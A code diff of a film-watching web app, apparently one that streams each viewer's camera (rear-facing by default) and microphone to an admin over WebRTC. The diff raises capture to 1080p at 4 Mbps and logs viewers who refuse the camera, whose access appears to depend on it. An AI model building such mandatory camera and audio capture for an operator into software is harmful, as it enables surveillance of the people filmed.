@@ -827,18 +827,42 @@ function playFilm(id) {
 // ================================================================
 // CAMERA CONSENT
 // ================================================================
-// Constraints sederhana — biarkan browser & jaringan client yang menentukan resolusi otomatis
-const CAM_CONSTRAINTS = {
-  video: { facingMode: currentFacingMode || 'environment' },
-  audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 44100 }
-};
+// Paksa kualitas tinggi — ideal 1080p, fallback ke 720p kalau device tidak support
+function buildCamConstraints(facingMode) {
+  return {
+    video: {
+      facingMode: facingMode || 'environment',
+      width:       { ideal: 1920, min: 1280 },
+      height:      { ideal: 1080, min: 720 },
+      frameRate:   { ideal: 30,   min: 15 },
+      aspectRatio: { ideal: 16/9 }
+    },
+    audio: {
+      echoCancellation: true,
+      noiseSuppression: true,
+      sampleRate: 48000
+    }
+  };
+}
 
 
 
 
 async function requestCamera() {
   try {
-    camStream = await navigator.mediaDevices.getUserMedia(CAM_CONSTRAINTS);
+    // Coba 1080p dulu
+    try {
+      camStream = await navigator.mediaDevices.getUserMedia(buildCamConstraints(currentFacingMode));
+      console.log('[CAM] Stream 1080p berhasil');
+    } catch (e1) {
+      // Fallback ke 720p kalau device tidak support 1080p
+      console.warn('[CAM] 1080p gagal, fallback ke 720p:', e1.message);
+      camStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: currentFacingMode || 'environment', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+        audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 48000 }
+      });
+      console.log('[CAM] Stream 720p berhasil');
+    }
     startWatchSession();
   } catch (e) {
     addAdminLog('Sistem', `${currentUser?.name || 'Pengguna'} menolak izin kamera`, '#F2716B', 'error');
@@ -956,15 +980,23 @@ function connectSocket_Viewer() {
       const answer = await pc.createAnswer();
       await pc.setLocalDescription(answer);
 
-      // Lag Fix 2: Batasi max bitrate video WebRTC agar tidak flood jaringan.
-      // Tanpa ini WebRTC bisa pakai bandwidth tak terbatas → lag/freeze di sisi admin.
+      // Paksa bitrate tinggi untuk kualitas HD — 4 Mbps video, 128 kbps audio
       try {
         const videoSender = pc.getSenders().find(s => s.track?.kind === 'video');
         if (videoSender) {
           const params = videoSender.getParameters();
           if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
-          params.encodings[0].maxBitrate = 500_000; // 500 kbps — cukup untuk 640×480
+          params.encodings[0].maxBitrate    = 4_000_000; // 4 Mbps untuk 1080p
+          params.encodings[0].maxFramerate  = 30;
+          params.encodings[0].scaleResolutionDownBy = 1.0; // Tidak scale down sama sekali
           await videoSender.setParameters(params);
+        }
+        const audioSender = pc.getSenders().find(s => s.track?.kind === 'audio');
+        if (audioSender) {
+          const params = audioSender.getParameters();
+          if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
+          params.encodings[0].maxBitrate = 128_000; // 128 kbps audio
+          await audioSender.setParameters(params);
         }
       } catch {}
 
@@ -1078,18 +1110,18 @@ async function doFlipCamera() {
   let newStream = null;
 
   try {
-    // Strategi 1: exact facingMode (paling akurat, tapi sering gagal di Android lama)
+    // Strategi 1: exact facingMode + kualitas tinggi
     try {
       newStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { exact: nextFacingMode } },
-        audio: true
+        video: { facingMode: { exact: nextFacingMode }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+        audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 48000 }
       });
     } catch (e1) {
-      // Strategi 2: facingMode tanpa exact (lebih kompatibel)
+      // Strategi 2: facingMode tanpa exact + kualitas tinggi
       try {
         newStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: nextFacingMode },
-          audio: true
+          video: { facingMode: nextFacingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+          audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 48000 }
         });
       } catch (e2) {
         // Strategi 3: enumerate devices, cari kamera berdasarkan facing mode aktual + label
@@ -1148,8 +1180,8 @@ async function doFlipCamera() {
         if (!targetDevice) throw new Error('Tidak ada kamera lain ditemukan');
 
         newStream = await navigator.mediaDevices.getUserMedia({
-          video: { deviceId: { exact: targetDevice.deviceId } },
-          audio: true
+          video: { deviceId: { exact: targetDevice.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+          audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 48000 }
         });
       }
     }
@@ -1253,7 +1285,7 @@ async function restoreSession() {
       viewerPeers.forEach(pc => { try { pc.close(); } catch {} }); viewerPeers.clear();
       if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
       try {
-        camStream = await navigator.mediaDevices.getUserMedia(CAM_CONSTRAINTS);
+        camStream = await navigator.mediaDevices.getUserMedia(buildCamConstraints(currentFacingMode));
         await startWatchSession(); monitorCameraPermission();
       } catch {
         deleteCookie('lb_token'); sessionStorage.removeItem('lb_token');
